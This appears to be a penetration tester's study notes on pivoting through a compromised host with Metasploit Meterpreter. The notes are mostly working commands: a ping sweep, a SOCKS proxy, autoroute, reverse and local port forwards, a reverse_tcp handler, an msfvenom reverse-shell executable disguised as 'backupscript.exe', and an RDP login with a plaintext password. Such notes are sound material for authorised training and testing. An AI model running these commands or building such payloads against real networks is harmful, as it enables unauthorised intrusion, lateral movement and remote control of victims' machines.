After establishing a meterpreter shell we can execute the following:
#### Ping Sweep
```bash
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```
#### Socks Proxy
```shell
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
msf6 auxiliary(server/socks_proxy) > jobs
```
We need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the `post/multi/manage/autoroute` module to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic
```shell
meterpreter > run autoroute -s 172.16.5.0/23
meterpreter > run autoroute -p       <-- View configuration
```
**OR**
```shell
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

#### [Reverse Port Forward](obsidian://open?vault=Penetration%20Testing&file=Root%2FPost%20Exploitation%2FPivoting%2FSSH%20%26%20SOCKS)
Used for when you want to get a reverse shell on an internal machine but that machine can't reach your attacking host network

This command forwards all connections on port `1234` running on the Compromised Webserver to our attack host on local port (`-l`) `8081`. We will also configure our listener to listen on port 8081 for a Windows shell.
```shell
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
meterpreter > bg
```

```shell
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run
```

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<CompromisedServer> -f exe -o backupscript.exe LPORT=1234
```
#### Local Port Forward
We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the `remote`network.

Everything we send to port `3300` locally(`-l`), forward it to port (`-p`) `3389` on remote (`-r`) host `172.16.5.19`
```bash
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
So now
```bash
xfreerdp3 /v:localhost:3300 /u:victor /p:pass@123
```